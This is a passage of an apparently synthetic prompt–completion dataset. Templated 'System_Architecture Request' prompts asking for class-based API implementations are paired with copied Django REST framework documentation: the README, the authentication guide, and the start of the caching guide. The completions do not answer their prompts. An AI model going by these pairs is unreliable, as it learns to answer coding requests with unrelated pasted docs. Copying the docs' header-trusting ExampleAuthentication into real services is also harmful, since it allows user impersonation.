for [OAuth1a][oauth1-section] and [OAuth2][oauth2-section].\n* [Serialization][serializers] that supports both [ORM][modelserializer-section] and [non-ORM][serializer-section] data sources.\n* Customizable all the way down - just use [regular function-based views][functionview-section] if you don't need the [more][generic-views] [powerful][viewsets] [features][routers].\n* [Extensive documentation][docs], and [great community support][group].\n\n**Below**: *Screenshot from the browsable API*\n\n![Screenshot][image]\n\n----\n\n# Requirements\n\n* Python 3.9+\n* Django 4.2, 5.0, 5.1, 5.2\n\nWe **highly recommend** and only officially support the latest patch release of\neach Python and Django series.\n\n# Installation\n\nInstall using `pip`...\n\n    pip install djangorestframework\n\nAdd `'rest_framework'` to your `INSTALLED_APPS` setting.\n```python\nINSTALLED_APPS = [\n    ...\n    'rest_framework',\n]\n```\n\n# Example\n\nLet's take a look at a quick example of using REST framework to build a simple model-backed API for accessing users and groups.\n\nStartup up a new project like so...\n\n    pip install django\n    pip install djangorestframework\n    django-admin startproject example .\n    ./manage.py migrate\n    ./manage.py createsuperuser\n\n\nNow edit the `example/urls.py` module in your project:\n\n```python\nfrom django.contrib.auth.models import User\nfrom django.urls import include, path\nfrom rest_framework import routers, serializers, viewsets\n\n\n# Serializers define the API representation.\nclass UserSerializer(serializers.HyperlinkedModelSerializer):\n    class Meta:\n        model = User\n        fields = ['url', 'username', 'email', 'is_staff']\n\n\n# ViewSets define the view behavior.\nclass UserViewSet(viewsets.ModelViewSet):\n    queryset = User.objects.all()\n    serializer_class = UserSerializer\n\n\n# Routers provide a way of automatically determining the URL conf.\nrouter = routers.DefaultRouter()\nrouter.register(r'users', UserViewSet)\n\n# Wire up our API using automatic URL routing.\n# Additionally, we include login URLs for the browsable API.\nurlpatterns = [\n    path('', include(router.urls)),\n    path('api-auth/', include('rest_framework.urls', namespace='rest_framework')),\n]\n```\n\nWe'd also like to configure a couple of settings for our API.\n\nAdd the following to your `settings.py` module:\n\n```python\nINSTALLED_APPS = [\n    ...  # Make sure to include the default installed apps here.\n    'rest_framework',\n]\n\nREST_FRAMEWORK = {\n    # Use Django's standard `django.contrib.auth` permissions,\n    # or allow read-only access for unauthenticated users.\n    'DEFAULT_PERMISSION_CLASSES': [\n        'rest_framework.permissions.DjangoModelPermissionsOrAnonReadOnly',\n    ]\n}\n```\n\nThat's it, we're done!\n\n    ./manage.py runserver\n\nYou can now open the API in your browser at `http://127.0.0.1:8000/`, and view your new 'users' API. If you use the `Login` control in the top right corner you'll also be able to add, create and delete users from the system.\n\nYou can also interact with the API using command line tools such as [`curl`](https://curl.haxx.se/). For example, to list the users endpoint:\n\n    $ curl -H 'Accept: application/json; indent=4' -u admin:password http://127.0.0.1:8000/users/\n    [\n        {\n            \"url\": \"http://127.0.0.1:8000/users/1/\",\n            \"username\": \"admin\",\n            \"email\": \"admin@example.com\",\n            \"is_staff\": true,\n        }\n    ]\n\nOr to create a new user:\n\n    $ curl -X POST -d username=new -d email=new@example.com -d is_staff=false -H 'Accept: application/json; indent=4' -u admin:password http://127.0.0.1:8000/users/\n    {\n        \"url\": \"http://127.0.0.1:8000/users/2/\",\n        \"username\": \"new\",\n        \"email\": \"new@example.com\",\n        \"is_staff\": false,\n    }\n\n# Documentation & Support\n\nFull documentation for the project is available at [https://www.django-rest-framework.org/][docs].\n\nFor questions and support, use the [REST framework discussion group][group], or `#restframework` on libera.chat IRC.\n\n# Security\n\nPlease see the [security policy][security-policy].\n\n[build-status-image]: https://github.com/encode/django-rest-framework/actions/workflows/main.yml/badge.svg\n[build-status]: https://github.com/encode/django-rest-framework/actions/workflows/main.yml\n[coverage-status-image]: https://img.shields.io/codecov/c/github/encode/django-rest-framework/master.svg\n[codecov]: https://codecov.io/github/encode/django-rest-framework?branch=master\n[pypi-version]: https://img.shields.io/pypi/v/djangorestframework.svg\n[pypi]: https://pypi.org/project/djangorestframework/\n[group]: https://groups.google.com/forum/?fromgroups#!forum/django-rest-framework\n\n[funding]: https://fund.django-rest-framework.org/topics/funding/\n[sponsors]: https://fund.django-rest-framework.org/topics/funding/#our-sponsors\n\n[sentry-img]: https://raw.githubusercontent.com/encode/django-rest-framework/master/docs/img/premium/sentry-readme.png\n[stream-img]: https://raw.githubusercontent.com/encode/django-rest-framework/master/docs/img/premium/stream-readme.png\n[spacinov-img]: https://raw.githubusercontent.com/encode/django-rest-framework/master/docs/img/premium/spacinov-readme.png\n[retool-img]: https://raw.githubusercontent.com/encode/django-rest-framework/master/docs/img/premium/retool-readme.png\n[bitio-img]: https://raw.githubusercontent.com/encode/django-rest-framework/master/docs/img/premium/bitio-readme.png\n[posthog-img]: https://raw.githubusercontent.com/encode/django-rest-framework/master/docs/img/premium/posthog-readme.png\n[cryptapi-img]: https://raw.githubusercontent.com/encode/django-rest-framework/master/docs/img/premium/cryptapi-readme.png\n[fezto-img]: https://raw.githubusercontent.com/encode/django-rest-framework/master/docs/img/premium/fezto-readme.png\n[svix-img]: https://raw.githubusercontent.com/encode/django-rest-framework/master/docs/img/premium/svix-premium.png\n[zuplo-img]: https://raw.githubusercontent.com/encode/django-rest-framework/master/docs/img/premium/zuplo-readme.png\n\n[sentry-url]: https://getsentry.com/welcome/\n[stream-url]: https://getstream.io/?utm_source=DjangoRESTFramework&utm_medium=Webpage_Logo_Ad&utm_content=Developer&utm_campaign=DjangoRESTFramework_Jan2022_HomePage\n[spacinov-url]: https://www.spacinov.com/\n[retool-url]: https://retool.com/?utm_source=djangorest&utm_medium=sponsorship\n[bitio-url]: https://bit.io/jobs?utm_source=DRF&utm_medium=sponsor&utm_campaign=DRF_sponsorship\n[posthog-url]: https://posthog.com?utm_source=drf&utm_medium=sponsorship&utm_campaign=open-source-sponsorship\n[cryptapi-url]: https://cryptapi.io\n[fezto-url]: https://www.fezto.xyz/?utm_source=DjangoRESTFramework\n[svix-url]: https://www.svix.com/?utm_source=django-REST&utm_medium=sponsorship\n[zuplo-url]: https://zuplo.link/django-gh\n\n[oauth1-section]: https://www.django-rest-framework.org/api-guide/authentication/#django-rest-framework-oauth\n[oauth2-section]: https://www.django-rest-framework.org/api-guide/authentication/#django-oauth-toolkit\n[serializer-section]: https://www.django-rest-framework.org/api-guide/serializers/#serializers\n[modelserializer-section]: https://www.django-rest-framework.org/api-guide/serializers/#modelserializer\n[functionview-section]: https://www.django-rest-framework.org/api-guide/views/#function-based-views\n[generic-views]: https://www.django-rest-framework.org/api-guide/generic-views/\n[viewsets]: https://www.django-rest-framework.org/api-guide/viewsets/\n[routers]: https://www.django-rest-framework.org/api-guide/routers/\n[serializers]: https://www.django-rest-framework.org/api-guide/serializers/\n[authentication]: https://www.django-rest-framework.org/api-guide/authentication/\n[image]: https://www.django-rest-framework.org/img/quickstart.png\n\n[docs]: https://www.django-rest-framework.org/\n[security-policy]: https://github.com/encode/django-rest-framework/security/policy\n", "metadata": {"source": "github.com/encode/django-rest-framework", "file_path": "README.md", "language": "markdown", "complexity": "complex", "star_count": 29336, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": true, "line_count": 227}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "---\nsource:\n    - authentication.py\n---\n\n# Authentication\n\n> Auth needs to be pluggable.\n>\n> &mdash; Jacob Kaplan-Moss, [\"REST worst practices\"][cite]\n\nAuthentication is the mechanism of associating an incoming request with a set of identifying credentials, such as the user the request came from, or the token that it was signed with.  The [permission] and [throttling] policies can then use those credentials to determine if the request should be permitted.\n\nREST framework provides several authentication schemes out of the box, and also allows you to implement custom schemes.\n\nAuthentication always runs at the very start of the view, before the permission and throttling checks occur, and before any other code is allowed to proceed.\n\nThe `request.user` property will typically be set to an instance of the `contrib.auth` package's `User` class.\n\nThe `request.auth` property is used for any additional authentication information, for example, it may be used to represent an authentication token that the request was signed with.\n\n---\n\n**Note:** Don't forget that **authentication by itself won't allow or disallow an incoming request**, it simply identifies the credentials that the request was made with.\n\nFor information on how to set up the permission policies for your API please see the [permissions documentation][permission].\n\n---\n\n## How authentication is determined\n\nThe authentication schemes are always defined as a list of classes.  REST framework will attempt to authenticate with each class in the list, and will set `request.user` and `request.auth` using the return value of the first class that successfully authenticates.\n\nIf no class authenticates, `request.user` will be set to an instance of `django.contrib.auth.models.AnonymousUser`, and `request.auth` will be set to `None`.\n\nThe value of `request.user` and `request.auth` for unauthenticated requests can be modified using the `UNAUTHENTICATED_USER` and `UNAUTHENTICATED_TOKEN` settings.\n\n## Setting the authentication scheme\n\nThe default authentication schemes may be set globally, using the `DEFAULT_AUTHENTICATION_CLASSES` setting.  For example.\n\n    REST_FRAMEWORK = {\n        'DEFAULT_AUTHENTICATION_CLASSES': [\n            'rest_framework.authentication.BasicAuthentication',\n            'rest_framework.authentication.SessionAuthentication',\n        ]\n    }\n\nYou can also set the authentication scheme on a per-view or per-viewset basis,\nusing the `APIView` class-based views.\n\n    from rest_framework.authentication import SessionAuthentication, BasicAuthentication\n    from rest_framework.permissions import IsAuthenticated\n    from rest_framework.response import Response\n    from rest_framework.views import APIView\n\n    class ExampleView(APIView):\n        authentication_classes = [SessionAuthentication, BasicAuthentication]\n        permission_classes = [IsAuthenticated]\n\n        def get(self, request, format=None):\n            content = {\n                'user': str(request.user),  # `django.contrib.auth.User` instance.\n                'auth': str(request.auth),  # None\n            }\n            return Response(content)\n\nOr, if you're using the `@api_view` decorator with function based views.\n\n    @api_view(['GET'])\n    @authentication_classes([SessionAuthentication, BasicAuthentication])\n    @permission_classes([IsAuthenticated])\n    def example_view(request, format=None):\n        content = {\n            'user': str(request.user),  # `django.contrib.auth.User` instance.\n            'auth': str(request.auth),  # None\n        }\n        return Response(content)\n\n## Unauthorized and Forbidden responses\n\nWhen an unauthenticated request is denied permission there are two different error codes that may be appropriate.\n\n* [HTTP 401 Unauthorized][http401]\n* [HTTP 403 Permission Denied][http403]\n\nHTTP 401 responses must always include a `WWW-Authenticate` header, that instructs the client how to authenticate.  HTTP 403 responses do not include the `WWW-Authenticate` header.\n\nThe kind of response that will be used depends on the authentication scheme.  Although multiple authentication schemes may be in use, only one scheme may be used to determine the type of response.  **The first authentication class set on the view is used when determining the type of response**.\n\nNote that when a request may successfully authenticate, but still be denied permission to perform the request, in which case a `403 Permission Denied` response will always be used, regardless of the authentication scheme.\n\n## Django 5.1+ `LoginRequiredMiddleware`\n\nIf you're running Django 5.1+ and use the [`LoginRequiredMiddleware`][login-required-middleware], please note that all views from DRF are opted-out of this middleware.  This is because the authentication in DRF is based authentication and permissions classes, which may be determined after the middleware has been applied.  Additionally, when the request is not authenticated, the middleware redirects the user to the login page, which is not suitable for API requests, where it's preferable to return a 401 status code.\n\nREST framework offers an equivalent mechanism for DRF views via the global settings, `DEFAULT_AUTHENTICATION_CLASSES` and `DEFAULT_PERMISSION_CLASSES`.  They should be changed accordingly if you need to enforce that API requests are logged in.\n\n## Apache mod_wsgi specific configuration\n\nNote that if deploying to [Apache using mod_wsgi][mod_wsgi_official], the authorization header is not passed through to a WSGI application by default, as it is assumed that authentication will be handled by Apache, rather than at an application level.\n\nIf you are deploying to Apache, and using any non-session based authentication, you will need to explicitly configure mod_wsgi to pass the required headers through to the application.  This can be done by specifying the `WSGIPassAuthorization` directive in the appropriate context and setting it to `'On'`.\n\n    # this can go in either server config, virtual host, directory or .htaccess\n    WSGIPassAuthorization On\n\n---\n\n# API Reference\n\n## BasicAuthentication\n\nThis authentication scheme uses [HTTP Basic Authentication][basicauth], signed against a user's username and password.  Basic authentication is generally only appropriate for testing.\n\nIf successfully authenticated, `BasicAuthentication` provides the following credentials.\n\n* `request.user` will be a Django `User` instance.\n* `request.auth` will be `None`.\n\nUnauthenticated responses that are denied permission will result in an `HTTP 401 Unauthorized` response with an appropriate WWW-Authenticate header.  For example:\n\n    WWW-Authenticate: Basic realm=\"api\"\n\n**Note:** If you use `BasicAuthentication` in production you must ensure that your API is only available over `https`.  You should also ensure that your API clients will always re-request the username and password at login, and will never store those details to persistent storage.\n\n## TokenAuthentication\n\n---\n\n**Note:** The token authentication provided by Django REST framework is a fairly simple implementation.\n\nFor an implementation which allows more than one token per user, has some tighter security implementation details, and supports token expiry, please see the [Django REST Knox][django-rest-knox] third party package.\n\n---\n\nThis authentication scheme uses a simple token-based HTTP Authentication scheme.  Token authentication is appropriate for client-server setups, such as native desktop and mobile clients.\n\nTo use the `TokenAuthentication` scheme you'll need to [configure the authentication classes](#setting-the-authentication-scheme) to include `TokenAuthentication`, and additionally include `rest_framework.authtoken` in your `INSTALLED_APPS` setting:\n\n    INSTALLED_APPS = [\n        ...\n        'rest_framework.authtoken'\n    ]\n\nMake sure to run `manage.py migrate` after changing your settings.\n\nThe `rest_framework.authtoken` app provides Django database migrations.\n\nYou'll also need to create tokens for your users.\n\n    from rest_framework.authtoken.models import Token\n\n    token = Token.objects.create(user=...)\n    print(token.key)\n\nFor clients to authenticate, the token key should be included in the `Authorization` HTTP header.  The key should be prefixed by the string literal \"Token\", with whitespace separating the two strings.  For example:\n\n    Authorization: Token 9944b09199c62bcf9418ad846dd0e4bbdfc6ee4b\n\n*If you want to use a different keyword in the header, such as `Bearer`, simply subclass `TokenAuthentication` and set the `keyword` class variable.*\n\nIf successfully authenticated, `TokenAuthentication` provides the following credentials.\n\n* `request.user` will be a Django `User` instance.\n* `request.auth` will be a `rest_framework.authtoken.models.Token` instance.\n\nUnauthenticated responses that are denied permission will result in an `HTTP 401 Unauthorized` response with an appropriate WWW-Authenticate header.  For example:\n\n    WWW-Authenticate: Token\n\nThe `curl` command line tool may be useful for testing token authenticated APIs.  For example:\n\n    curl -X GET http://127.0.0.1:8000/api/example/ -H 'Authorization: Token 9944b09199c62bcf9418ad846dd0e4bbdfc6ee4b'\n\n---\n\n**Note:** If you use `TokenAuthentication` in production you must ensure that your API is only available over `https`.\n\n---\n\n### Generating Tokens\n\n#### By using signals\n\nIf you want every user to have an automatically generated Token, you can simply catch the User's `post_save` signal.\n\n    from django.conf import settings\n    from django.db.models.signals import post_save\n    from django.dispatch import receiver\n    from rest_framework.authtoken.models import Token\n\n    @receiver(post_save, sender=settings.AUTH_USER_MODEL)\n    def create_auth_token(sender, instance=None, created=False, **kwargs):\n        if created:\n            Token.objects.create(user=instance)\n\nNote that you'll want to ensure you place this code snippet in an installed `models.py` module, or some other location that will be imported by Django on startup.\n\nIf you've already created some users, you can generate tokens for all existing users like this:\n\n    from django.contrib.auth.models import User\n    from rest_framework.authtoken.models import Token\n\n    for user in User.objects.all():\n        Token.objects.get_or_create(user=user)\n\n#### By exposing an api endpoint\n\nWhen using `TokenAuthentication`, you may want to provide a mechanism for clients to obtain a token given the username and password.  REST framework provides a built-in view to provide this behavior.  To use it, add the `obtain_auth_token` view to your URLconf:\n\n    from rest_framework.authtoken import views\n    urlpatterns += [\n        path('api-token-auth/', views.obtain_auth_token)\n    ]\n\nNote that the URL part of the pattern can be whatever you want to use.\n\nThe `obtain_auth_token` view will return a JSON response when valid `username` and `password` fields are POSTed to the view using form data or JSON:\n\n    { 'token' : '9944b09199c62bcf9418ad846dd0e4bbdfc6ee4b' }\n\nNote that the default `obtain_auth_token` view explicitly uses JSON requests and responses, rather than using default renderer and parser classes in your settings.\n\nBy default, there are no permissions or throttling applied to the `obtain_auth_token` view. If you do wish to apply throttling you'll need to override the view class,\nand include them using the `throttle_classes` attribute.\n\nIf you need a customized version of the `obtain_auth_token` view, you can do so by subclassing the `ObtainAuthToken` view class, and using that in your url conf instead.\n\nFor example, you may return additional user information beyond the `token` value:\n\n    from rest_framework.authtoken.views import ObtainAuthToken\n    from rest_framework.authtoken.models import Token\n    from rest_framework.response import Response\n\n    class CustomAuthToken(ObtainAuthToken):\n\n        def post(self, request, *args, **kwargs):\n            serializer = self.serializer_class(data=request.data,\n                                               context={'request': request})\n            serializer.is_valid(raise_exception=True)\n            user = serializer.validated_data['user']\n            token, created = Token.objects.get_or_create(user=user)\n            return Response({\n                'token': token.key,\n                'user_id': user.pk,\n                'email': user.email\n            })\n\nAnd in your `urls.py`:\n\n    urlpatterns += [\n        path('api-token-auth/', CustomAuthToken.as_view())\n    ]\n\n\n#### With Django admin\n\nIt is also possible to create Tokens manually through the admin interface. In case you are using a large user base, we recommend that you monkey patch the `TokenAdmin` class to customize it to your needs, more specifically by declaring the `user` field as `raw_field`.\n\n`your_app/admin.py`:\n\n    from rest_framework.authtoken.admin import TokenAdmin\n\n    TokenAdmin.raw_id_fields = ['user']\n\n\n#### Using Django manage.py command\n\nSince version 3.6.4 it's possible to generate a user token using the following command:\n\n    ./manage.py drf_create_token <username>\n\nthis command will return the API token for the given user, creating it if it doesn't exist:\n\n    Generated token 9944b09199c62bcf9418ad846dd0e4bbdfc6ee4b for user user1\n\nIn case you want to regenerate the token (for example if it has been compromised or leaked) you can pass an additional parameter:\n\n    ./manage.py drf_create_token -r <username>\n\n\n## SessionAuthentication\n\nThis authentication scheme uses Django's default session backend for authentication.  Session authentication is appropriate for AJAX clients that are running in the same session context as your website.\n\nIf successfully authenticated, `SessionAuthentication` provides the following credentials.\n\n* `request.user` will be a Django `User` instance.\n* `request.auth` will be `None`.\n\nUnauthenticated responses that are denied permission will result in an `HTTP 403 Forbidden` response.\n\nIf you're using an AJAX-style API with SessionAuthentication, you'll need to make sure you include a valid CSRF token for any \"unsafe\" HTTP method calls, such as `PUT`, `PATCH`, `POST` or `DELETE` requests.  See the [Django CSRF documentation][csrf-ajax] for more details.\n\n**Warning**: Always use Django's standard login view when creating login pages. This will ensure your login views are properly protected.\n\nCSRF validation in REST framework works slightly differently from standard Django due to the need to support both session and non-session based authentication to the same views. This means that only authenticated requests require CSRF tokens, and anonymous requests may be sent without CSRF tokens. This behavior is not suitable for login views, which should always have CSRF validation applied.\n\n\n## RemoteUserAuthentication\n\nThis authentication scheme allows you to delegate authentication to your web server, which sets the `REMOTE_USER`\nenvironment variable.\n\nTo use it, you must have `django.contrib.auth.backends.RemoteUserBackend` (or a subclass) in your\n`AUTHENTICATION_BACKENDS` setting. By default, `RemoteUserBackend` creates `User` objects for usernames that don't\nalready exist. To change this and other behavior, consult the\n[Django documentation](https://docs.djangoproject.com/en/stable/howto/auth-remote-user/).\n\nIf successfully authenticated, `RemoteUserAuthentication` provides the following credentials:\n\n* `request.user` will be a Django `User` instance.\n* `request.auth` will be `None`.\n\nConsult your web server's documentation for information about configuring an authentication method, for example:\n\n* [Apache Authentication How-To](https://httpd.apache.org/docs/2.4/howto/auth.html)\n* [NGINX (Restricting Access)](https://docs.nginx.com/nginx/admin-guide/security-controls/configuring-http-basic-authentication/)\n\n\n# Custom authentication\n\nTo implement a custom authentication scheme, subclass `BaseAuthentication` and override the `.authenticate(self, request)` method.  The method should return a two-tuple of `(user, auth)` if authentication succeeds, or `None` otherwise.\n\nIn some circumstances instead of returning `None`, you may want to raise an `AuthenticationFailed` exception from the `.authenticate()` method.\n\nTypically the approach you should take is:\n\n* If authentication is not attempted, return `None`.  Any other authentication schemes also in use will still be checked.\n* If authentication is attempted but fails, raise an `AuthenticationFailed` exception.  An error response will be returned immediately, regardless of any permissions checks, and without checking any other authentication schemes.\n\nYou *may* also override the `.authenticate_header(self, request)` method.  If implemented, it should return a string that will be used as the value of the `WWW-Authenticate` header in a `HTTP 401 Unauthorized` response.\n\nIf the `.authenticate_header()` method is not overridden, the authentication scheme will return `HTTP 403 Forbidden` responses when an unauthenticated request is denied access.\n\n---\n\n**Note:** When your custom authenticator is invoked by the request object's `.user` or `.auth` properties, you may see an `AttributeError` re-raised as a `WrappedAttributeError`. This is necessary to prevent the original exception from being suppressed by the outer property access. Python will not recognize that the `AttributeError` originates from your custom authenticator and will instead assume that the request object does not have a `.user` or `.auth` property. These errors should be fixed or otherwise handled by your authenticator.\n\n---\n\n## Example\n\nThe following example will authenticate any incoming request as the user given by the username in a custom request header named 'X-USERNAME'.\n\n    from django.contrib.auth.models import User\n    from rest_framework import authentication\n    from rest_framework import exceptions\n\n    class ExampleAuthentication(authentication.BaseAuthentication):\n        def authenticate(self, request):\n            username = request.META.get('HTTP_X_USERNAME')\n            if not username:\n                return None\n\n            try:\n                user = User.objects.get(username=username)\n            except User.DoesNotExist:\n                raise exceptions.AuthenticationFailed('No such user')\n\n            return (user, None)\n\n---\n\n# Third party packages\n\nThe following third-party packages are also available.\n\n## django-rest-knox\n\n[Django-rest-knox][django-rest-knox] library provides models and views to handle token-based authentication in a more secure and extensible way than the built-in TokenAuthentication scheme - with Single Page Applications and Mobile clients in mind. It provides per-client tokens, and views to generate them when provided some other authentication (usually basic authentication), to delete the token (providing a server enforced logout) and to delete all tokens (logs out all clients that a user is logged into).\n\n## Django OAuth Toolkit\n\nThe [Django OAuth Toolkit][django-oauth-toolkit] package provides OAuth 2.0 support and works with Python 3.4+. The package is maintained by [jazzband][jazzband] and uses the excellent [OAuthLib][oauthlib].  The package is well documented, and well supported and is currently our **recommended package for OAuth 2.0 support**.\n\n### Installation & configuration\n\nInstall using `pip`.\n\n    pip install django-oauth-toolkit\n\nAdd the package to your `INSTALLED_APPS` and modify your REST framework settings.\n\n    INSTALLED_APPS = [\n        ...\n        'oauth2_provider',\n    ]\n\n    REST_FRAMEWORK = {\n        'DEFAULT_AUTHENTICATION_CLASSES': [\n            'oauth2_provider.contrib.rest_framework.OAuth2Authentication',\n        ]\n    }\n\nFor more details see the [Django REST framework - Getting started][django-oauth-toolkit-getting-started] documentation.\n\n## Django REST framework OAuth\n\nThe [Django REST framework OAuth][django-rest-framework-oauth] package provides both OAuth1 and OAuth2 support for REST framework.\n\nThis package was previously included directly in the REST framework but is now supported and maintained as a third-party package.\n\n### Installation & configuration\n\nInstall the package using `pip`.\n\n    pip install djangorestframework-oauth\n\nFor details on configuration and usage see the Django REST framework OAuth documentation for [authentication][django-rest-framework-oauth-authentication] and [permissions][django-rest-framework-oauth-permissions].\n\n## JSON Web Token Authentication\n\nJSON Web Token is a fairly new standard which can be used for token-based authentication. Unlike the built-in TokenAuthentication scheme, JWT Authentication doesn't need to use a database to validate a token. A package for JWT authentication is [djangorestframework-simplejwt][djangorestframework-simplejwt] which provides some features as well as a pluggable token blacklist app.\n\n## Hawk HTTP Authentication\n\nThe [HawkREST][hawkrest] library builds on the [Mohawk][mohawk] library to let you work with [Hawk][hawk] signed requests and responses in your API. [Hawk][hawk] lets two parties securely communicate with each other using messages signed by a shared key. It is based on [HTTP MAC access authentication][mac] (which was based on parts of [OAuth 1.0][oauth-1.0a]).\n\n## HTTP Signature Authentication\n\nHTTP Signature (currently a [IETF draft][http-signature-ietf-draft]) provides a way to achieve origin authentication and message integrity for HTTP messages. Similar to [Amazon's HTTP Signature scheme][amazon-http-signature], used by many of its services, it permits stateless, per-request authentication. [Elvio Toccalino][etoccalino] maintains the [djangorestframework-httpsignature][djangorestframework-httpsignature] (outdated) package which provides an easy-to-use HTTP Signature Authentication mechanism. You can use the updated fork version of [djangorestframework-httpsignature][djangorestframework-httpsignature], which is [drf-httpsig][drf-httpsig].\n\n## Djoser\n\n[Djoser][djoser] library provides a set of views to handle basic actions such as registration, login, logout, password reset and account activation. The package works with a custom user model and uses token-based authentication. This is a ready to use REST implementation of the Django authentication system.\n\n## django-rest-auth / dj-rest-auth\n\nThis library provides a set of REST API endpoints for registration, authentication (including social media authentication), password reset, retrieve and update user details, etc. By having these API endpoints, your client apps such as AngularJS, iOS, Android, and others can communicate to your Django backend site independently via REST APIs for user management.\n\n\nThere are currently two forks of this project.\n\n* [Django-rest-auth][django-rest-auth] is the original project, [but is not currently receiving updates](https://github.com/Tivix/django-rest-auth/issues/568).\n* [Dj-rest-auth][dj-rest-auth] is a newer fork of the project.\n\n## drf-social-oauth2\n\n[Drf-social-oauth2][drf-social-oauth2] is a framework that helps you authenticate with major social oauth2 vendors, such as Facebook, Google, Twitter, Orcid, etc. It generates tokens in a JWTed way with an easy setup.\n\n## drfpasswordless\n\n[drfpasswordless][drfpasswordless] adds (Medium, Square Cash inspired) passwordless support to Django REST Framework's TokenAuthentication scheme. Users log in and sign up with a token sent to a contact point like an email address or a mobile number.\n\n## django-rest-authemail\n\n[django-rest-authemail][django-rest-authemail] provides a RESTful API interface for user signup and authentication. Email addresses are used for authentication, rather than usernames.  API endpoints are available for signup, signup email verification, login, logout, password reset, password reset verification, email change, email change verification, password change, and user detail.  A fully functional example project and detailed instructions are included.\n\n## Django-Rest-Durin\n\n[Django-Rest-Durin][django-rest-durin] is built with the idea to have one library that does token auth for multiple Web/CLI/Mobile API clients via one interface but allows different token configuration for each API Client that consumes the API. It provides support for multiple tokens per user via custom models, views, permissions that work with Django-Rest-Framework. The token expiration time can be different per API client and is customizable via the Django Admin Interface.\n\nMore information can be found in the [Documentation](https://django-rest-durin.readthedocs.io/en/latest/index.html).\n\n## django-pyoidc\n\n[dango-pyoidc][django_pyoidc] adds support for OpenID Connect (OIDC) authentication. This allows you to delegate user management to an Identity Provider, which can be used to implement Single-Sign-On (SSO). It provides support for most uses-cases, such as customizing how token info are mapped to user models, using OIDC audiences for access control, etc.\n\nMore information can be found in the [Documentation](https://django-pyoidc.readthedocs.io/latest/index.html).\n\n[cite]: https://jacobian.org/writing/rest-worst-practices/\n[http401]: https://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html#sec10.4.2\n[http403]: https://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html#sec10.4.4\n[basicauth]: https://tools.ietf.org/html/rfc2617\n[permission]: permissions.md\n[throttling]: throttling.md\n[csrf-ajax]: https://docs.djangoproject.com/en/stable/howto/csrf/#using-csrf-protection-with-ajax\n[mod_wsgi_official]: https://modwsgi.readthedocs.io/en/develop/configuration-directives/WSGIPassAuthorization.html\n[django-oauth-toolkit-getting-started]: https://django-oauth-toolkit.readthedocs.io/en/latest/rest-framework/getting_started.html\n[django-rest-framework-oauth]: https://jpadilla.github.io/django-rest-framework-oauth/\n[django-rest-framework-oauth-authentication]: https://jpadilla.github.io/django-rest-framework-oauth/authentication/\n[django-rest-framework-oauth-permissions]: https://jpadilla.github.io/django-rest-framework-oauth/permissions/\n[juanriaza]: https://github.com/juanriaza\n[djangorestframework-digestauth]: https://github.com/juanriaza/django-rest-framework-digestauth\n[oauth-1.0a]: https://oauth.net/core/1.0a/\n[django-oauth-toolkit]: https://github.com/evonove/django-oauth-toolkit\n[jazzband]: https://github.com/jazzband/\n[oauthlib]: https://github.com/idan/oauthlib\n[djangorestframework-simplejwt]: https://github.com/davesque/django-rest-framework-simplejwt\n[etoccalino]: https://github.com/etoccalino/\n[djangorestframework-httpsignature]: https://github.com/etoccalino/django-rest-framework-httpsignature\n[drf-httpsig]: https://github.com/ahknight/drf-httpsig\n[amazon-http-signature]: https://docs.aws.amazon.com/general/latest/gr/signature-version-4.html\n[http-signature-ietf-draft]: https://datatracker.ietf.org/doc/draft-cavage-http-signatures/\n[hawkrest]: https://hawkrest.readthedocs.io/en/latest/\n[hawk]: https://github.com/hueniverse/hawk\n[mohawk]: https://mohawk.readthedocs.io/en/latest/\n[mac]: https://tools.ietf.org/html/draft-hammer-oauth-v2-mac-token-05\n[djoser]: https://github.com/sunscrapers/djoser\n[django-rest-auth]: https://github.com/Tivix/django-rest-auth\n[dj-rest-auth]: https://github.com/jazzband/dj-rest-auth\n[drf-social-oauth2]: https://github.com/wagnerdelima/drf-social-oauth2\n[django-rest-knox]: https://github.com/James1345/django-rest-knox\n[drfpasswordless]: https://github.com/aaronn/django-rest-framework-passwordless\n[django-rest-authemail]: https://github.com/celiao/django-rest-authemail\n[django-rest-durin]: https://github.com/eshaan7/django-rest-durin\n[login-required-middleware]: https://docs.djangoproject.com/en/stable/ref/middleware/#django.contrib.auth.middleware.LoginRequiredMiddleware\n[django-pyoidc] : https://github.com/makinacorpus/django_pyoidc\n", "metadata": {"source": "github.com/encode/django-rest-framework", "file_path": "docs/api-guide/authentication.md", "language": "markdown", "complexity": "complex", "star_count": 29336, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": true, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 501}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation with RESTful API design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Caching\n\n> A certain woman had a very sharp consciousness but almost no\n> memory ... She remembered enough to work, and she worked hard.\n> - Lydia Davis\n\nCaching in REST Framework works well with the cache utilities\nprovided in Django.\n\n---\n\n## Using cache with apiview and viewsets\n\nDjango provides a [`method_decorator`][decorator] to use\ndecorators with class based views. This can be used with\nother cache decorators such as [`cache_page`][page],\n[`vary_on_cookie`][cookie] and [`vary_on_headers`][headers].\n\n```python\nfrom django.utils.decorators import method_decorator\nfrom django.views.decorators.cache import cache_page\nfrom django.views.decorators.vary import vary_on_cookie, vary_on_headers\n\nfrom rest_framework.response import Response\nfrom rest_framework.views import APIView\nfrom rest_framework import viewsets\n\n\nclass UserViewSet(viewsets.ViewSet):\n    # With cookie: cache requested url for each user for 2 hours\n    @method_decorator(cache_page(60 * 60 * 2))\n    @method_decorator(vary_on_cookie)\n    def list(self, 